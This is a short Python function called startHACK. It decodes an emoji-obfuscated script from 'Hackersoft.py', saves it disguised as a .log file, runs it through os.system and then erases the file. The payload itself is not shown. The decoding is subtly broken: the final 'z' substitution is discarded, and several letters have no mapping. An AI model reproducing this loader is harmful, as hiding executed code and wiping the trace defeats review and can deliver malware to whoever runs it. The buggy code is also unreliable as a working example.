def startHACK():
    with open ('Hackersoft.py', 'r',  encoding='utf-8') as f:
        str = f.read()
    shifr = str.replace('⚠️', 'a')
    shifr = shifr.replace('✔️', 'b')
    shifr = shifr.replace('🧊', 'c')
    shifr = shifr.replace('❌', 'd')
    shifr = shifr.replace('😭', 'e')
    shifr = shifr.replace('❤️', 'f')
    shifr = shifr.replace('😶‍🌫️', 'i')
    shifr = shifr.replace('🥶', 'j')
    shifr = shifr.replace('🛒', 'k')
    shifr = shifr.replace('🤝', 'o')
    shifr = shifr.replace('🎗️', 'p')
    shifr = shifr.replace('🥵', 'q')
    shifr = shifr.replace('💀', 'r')
    shifr = shifr.replace('👾', 's')
    shifr = shifr.replace('🤢', 't')
    shifr = shifr.replace('🤮', 'u')
    shifr = shifr.replace('🦕', 'y')
    shifr = shifr.replace('🕸️', 'w')
    shifr = shifr.replace('🦐', 'x')
    shifr = shifr.replace('🙉', 'v')
    shifr_Programm = shifr.replace('🪳', 'z')
    with open ('files/file.log', 'w+',  encoding='utf-8') as f:
        f.write(shifr)
    with open ('files/file.log', 'r',  encoding='utf-8') as f:
        str = f.read()
    
    import os
    os.system('python "files/file.log"')
    
    with open ('files/file.log', 'w+',  encoding='utf-8') as f:
        f.write('')
    